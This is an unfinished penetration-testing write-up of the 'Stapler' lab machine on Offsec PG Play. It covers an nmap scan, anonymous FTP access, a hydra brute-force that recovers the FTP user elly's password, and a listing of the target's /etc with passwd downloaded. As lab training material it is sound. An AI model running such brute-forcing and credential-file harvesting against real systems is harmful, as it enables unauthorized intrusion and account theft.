---
title: "Stapler"
kind: writeup
tags:
  - offsec-pg-play
  - status/in-progress
  - writeup
status: "In progress"
difficulty: "Medium"
date: 2026-07-09
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 398759b92751800f8c1ae7b6b930903f
---

# Stapler

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/stapler 192.168.103.148
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 00:09 -0400
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.58% done; ETC: 00:11 (0:01:15 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 66.01% done; ETC: 00:11 (0:00:39 remaining)
Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:11 (0:00:06 remaining)
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.91% done; ETC: 00:11 (0:00:00 remaining)
Nmap scan report for 192.168.103.148
Host is up (0.064s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   tcpwrapped
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   pkzip-file  .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, FoundRows, LongColumnFlag, IgnoreSigpipes, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongPassword, ODBCClient, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x0D6|\x1D~gb5\x1E\x1F<Z[w%%\x0CVm<
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.99%I=7%D=7/9%Time=6A4F1F5B%P=x86_64-pc-linux-gnu%r(NULL
SF:,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-09T04:11:19
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2026-07-09T05:11:19+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.76 seconds

```

## Enumerating FTP

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 192.168.103.148                                                                                                  
Connected to 192.168.103.148.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.103.148:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> mget *
mget note [anpqy?]? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |******************************************************************************************************************************|   107        2.00 MiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (1.63 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
note  universal.ovpn
                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat note                              
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

```

## Bruteforcing FTP

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l elly -e nsr  ftp://192.168.103.148 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-09 00:40:46
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ftp://192.168.103.148:21/
[21][ftp] host: 192.168.103.148   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-09 00:41:00

```

## Elly FTP

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 Jun 03  2016 X11
drwxr-xr-x    3 0        0            4096 Jun 03  2016 acpi
-rw-r--r--    1 0        0            3028 Apr 20  2016 adduser.conf
-rw-r--r--    1 0        0              51 Jun 03  2016 aliases
-rw-r--r--    1 0        0           12288 Jun 03  2016 aliases.db
drwxr-xr-x    2 0        0            4096 Jun 07  2016 alternatives
drwxr-xr-x    8 0        0            4096 Jun 03  2016 apache2
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apparmor
drwxr-xr-x    9 0        0            4096 Jun 06  2016 apparmor.d
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apport
drwxr-xr-x    6 0        0            4096 Jun 03  2016 apt
-rw-r-----    1 0        1             144 Jan 14  2016 at.deny
drwxr-xr-x    5 0        0            4096 Jun 03  2016 authbind
-rw-r--r--    1 0        0            2188 Sep 01  2015 bash.bashrc
drwxr-xr-x    2 0        0            4096 Jun 03  2016 bash_completion.d
-rw-r--r--    1 0        0             367 Jan 27  2016 bindresvport.blacklist
drwxr-xr-x    2 0        0            4096 Apr 12  2016 binfmt.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 byobu
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ca-certificates
-rw-r--r--    1 0        0            7788 Jun 03  2016 ca-certificates.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 console-setup
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.daily
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.hourly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.monthly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.weekly
-rw-r--r--    1 0        0             722 Apr 05  2016 crontab
-rw-r--r--    1 0        0              54 Jun 03  2016 crypttab
drwxr-xr-x    2 0        0            4096 Jun 04  2016 dbconfig-common
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dbus-1
-rw-r--r--    1 0        0            2969 Nov 10  2015 debconf.conf
-rw-r--r--    1 0        0              12 Apr 30  2015 debian_version
drwxr-xr-x    3 0        0            4096 Jun 02  2021 default
-rw-r--r--    1 0        0             604 Jul 02  2015 deluser.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 depmod.d
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dhcp
-rw-r--r--    1 0        0           26716 Jul 30  2015 dnsmasq.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 dnsmasq.d
drwxr-xr-x    4 0        0            4096 Jun 07  2016 dpkg
-rw-r--r--    1 0        0              96 Apr 20  2016 environment
drwxr-xr-x    4 0        0            4096 Jun 03  2016 fonts
-rw-r--r--    1 0        0             594 Jun 03  2016 fstab
-rw-r--r--    1 0        0             132 Feb 11  2016 ftpusers
-rw-r--r--    1 0        0             280 Jun 20  2014 fuse.conf
-rw-r--r--    1 0        0            2584 Feb 18  2016 gai.conf
-rw-rw-r--    1 0        0            1253 Jun 04  2016 group
-rw-------    1 0        0            1240 Jun 03  2016 group-
drwxr-xr-x    2 0        0            4096 Jun 03  2016 grub.d
-rw-r-----    1 0        42           1004 Jun 04  2016 gshadow
-rw-------    1 0        0             995 Jun 03  2016 gshadow-
drwxr-xr-x    3 0        0            4096 Jun 03  2016 gss
-rw-r--r--    1 0        0              92 Oct 22  2015 host.conf
-rw-r--r--    1 0        0              12 Jun 03  2016 hostname
-rw-r--r--    1 0        0             469 Jun 05  2016 hosts
-rw-r--r--    1 0        0             411 Jun 03  2016 hosts.allow
-rw-r--r--    1 0        0             711 Jun 03  2016 hosts.deny
-rw-r--r--    1 0        0            1257 Jun 03  2016 inetd.conf
drwxr-xr-x    2 0        0            4096 Feb 06  2016 inetd.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 init
drwxr-xr-x    2 0        0            4096 May 05  2021 init.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 initramfs-tools
-rw-r--r--    1 0        0            1748 Feb 04  2016 inputrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 insserv
-rw-r--r--    1 0        0             771 Mar 06  2015 insserv.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 insserv.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iproute2
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iptables
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iscsi
-rw-r--r--    1 0        0             345 Jul 09 05:07 issue
-rw-r--r--    1 0        0             197 Jun 03  2016 issue.net
drwxr-xr-x    2 0        0            4096 Jun 03  2016 kbd
drwxr-xr-x    5 0        0            4096 Jun 03  2016 kernel
-rw-r--r--    1 0        0             144 Jun 03  2016 kernel-img.conf
-rw-r--r--    1 0        0           27105 May 05  2021 ld.so.cache
-rw-r--r--    1 0        0              34 Jan 27  2016 ld.so.conf
drwxr-xr-x    2 0        0            4096 Jun 07  2016 ld.so.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 ldap
-rw-r--r--    1 0        0             267 Oct 22  2015 legal
-rw-r--r--    1 0        0             191 Jan 19  2016 libaudit.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 libnl-3
drwxr-xr-x    4 0        0            4096 Jun 06  2016 lighttpd
-rw-r--r--    1 0        0            2995 Apr 14  2016 locale.alias
-rw-r--r--    1 0        0            9149 Jun 03  2016 locale.gen
-rw-r--r--    1 0        0            3687 Jun 03  2016 localtime
drwxr-xr-x    6 0        0            4096 Jun 03  2016 logcheck
-rw-r--r--    1 0        0           10551 Mar 29  2016 login.defs
-rw-r--r--    1 0        0             703 May 06  2015 logrotate.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 logrotate.d
-rw-r--r--    1 0        0             103 Apr 12  2016 lsb-release
drwxr-xr-x    2 0        0            4096 Jun 03  2016 lvm
-r--r--r--    1 0        0              33 Jun 03  2016 machine-id
-rw-r--r--    1 0        0             111 Nov 20  2015 magic
-rw-r--r--    1 0        0             111 Nov 20  2015 magic.mime
-rw-r--r--    1 0        0            2579 Jun 04  2016 mailcap
-rw-r--r--    1 0        0             449 Oct 30  2015 mailcap.order
drwxr-xr-x    2 0        0            4096 Jun 03  2016 mdadm
-rw-r--r--    1 0        0           24241 Oct 30  2015 mime.types
-rw-r--r--    1 0        0             967 Oct 30  2015 mke2fs.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modprobe.d
-rw-r--r--    1 0        0             195 Apr 20  2016 modules
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modules-load.d
lrwxrwxrwx    1 0        0              19 Jun 03  2016 mtab -> ../proc/self/mounts
drwxr-xr-x    4 0        0            4096 Jun 06  2016 mysql
drwxr-xr-x    7 0        0            4096 Aug 03  2024 network
-rw-r--r--    1 0        0              91 Oct 22  2015 networks
drwxr-xr-x    2 0        0            4096 Jun 03  2016 newt
-rw-r--r--    1 0        0             497 May 04  2014 nsswitch.conf
drwxr-xr-x    2 0        0            4096 Apr 20  2016 opt
lrwxrwxrwx    1 0        0              21 Jun 03  2016 os-release -> ../usr/lib/os-release
-rw-r--r--    1 0        0            6595 Jun 23  2015 overlayroot.conf
-rw-r--r--    1 0        0             552 Mar 16  2016 pam.conf
drwxr-xr-x    2 0        0            4096 May 05  2021 pam.d
-rw-r--r--    1 0        0            2908 Jun 04  2016 passwd
-rw-------    1 0        0            2869 Jun 03  2016 passwd-
drwxr-xr-x    4 0        0            4096 Jun 03  2016 perl
drwxr-xr-x    3 0        0            4096 Jun 03  2016 php
drwxr-xr-x    3 0        0            4096 Jun 06  2016 phpmyadmin
drwxr-xr-x    3 0        0            4096 Jun 03  2016 pm
drwxr-xr-x    5 0        0            4096 Jun 03  2016 polkit-1
drwxr-xr-x    3 0        0            4096 Jun 03  2016 postfix
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ppp
-rw-r--r--    1 0        0             575 Oct 22  2015 profile
drwxr-xr-x    2 0        0            4096 Jun 03  2016 profile.d
-rw-r--r--    1 0        0            2932 Oct 25  2014 protocols
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python2.7
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3.5
-rwxr-xr-x    1 0        0             472 Jun 06  2016 rc.local
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc0.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc1.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc2.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc3.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc4.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc5.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc6.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rcS.d
-rw-r--r--    1 0        0              27 Jul 09 05:07 resolv.conf
drwxr-xr-x    5 0        0            4096 Jun 06  2016 resolvconf
-rwxr-xr-x    1 0        0             268 Nov 10  2015 rmt
-rw-r--r--    1 0        0             887 Oct 25  2014 rpc
-rw-r--r--    1 0        0            1371 Jan 27  2016 rsyslog.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 rsyslog.d
drwxr-xr-x    3 0        0            4096 Jul 09 05:36 samba
-rw-r--r--    1 0        0            3663 Jun 09  2015 screenrc
-rw-r--r--    1 0        0            4038 Mar 29  2016 securetty
drwxr-xr-x    4 0        0            4096 Jun 03  2016 security
drwxr-xr-x    2 0        0            4096 Jun 03  2016 selinux
-rw-r--r--    1 0        0           19605 Oct 25  2014 services
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sgml
-rw-r-----    1 0        42           4518 Jun 01  2021 shadow
-rw-------    1 0        0            1873 Jun 03  2016 shadow-
-rw-r--r--    1 0        0             125 Jun 03  2016 shells
drwxr-xr-x    2 0        0            4096 Jun 03  2016 skel
-rw-r--r--    1 0        0             100 Nov 25  2015 sos.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ssh
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ssl
-rw-r--r--    1 0        0             644 Jun 04  2016 subgid
-rw-------    1 0        0             625 Jun 03  2016 subgid-
-rw-r--r--    1 0        0             644 Jun 04  2016 subuid
-rw-------    1 0        0             625 Jun 03  2016 subuid-
-r--r-----    1 0        0             769 Jun 05  2016 sudoers
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sudoers.d
-rw-r--r--    1 0        0            2227 Jun 03  2016 sysctl.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sysctl.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 systemd
drwxr-xr-x    2 0        0            4096 Jun 03  2016 terminfo
-rw-r--r--    1 0        0              14 Jun 03  2016 timezone
drwxr-xr-x    2 0        0            4096 Apr 12  2016 tmpfiles.d
-rw-r--r--    1 0        0            1260 Mar 16  2016 ucf.conf
drwxr-xr-x    4 0        0            4096 Jun 03  2016 udev
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ufw
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-motd.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-notifier
drwxr-xr-x    2 0        0            4096 Jun 03  2016 vim
drwxr-xr-x    4 0        0            4096 May 05  2021 vmware-tools
-rw-r--r--    1 0        0             278 Jun 03  2016 vsftpd.banner
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.chroot_list
-rw-r--r--    1 0        0            5961 Jun 04  2016 vsftpd.conf
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.user_list
lrwxrwxrwx    1 0        0              23 Jun 03  2016 vtrgb -> /etc/alternatives/vtrgb
-rw-r--r--    1 0        0            4942 Jan 08  2016 wgetrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 xdg
drwxr-xr-x    2 0        0            4096 Jun 03  2016 xml
drwxr-xr-x    2 0        0            4096 Jun 03  2016 zsh
226 Directory send OK.
ftp> get passwd
local: passwd remote: passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for passwd (2908 bytes).
100% |******************************************************************************************************************************|  2908        6.34 MiB/s    00:00 ETA
226 Transfer complete.
2908 bytes received in 00:00 (43.15 KiB/s)
ftp> 

```
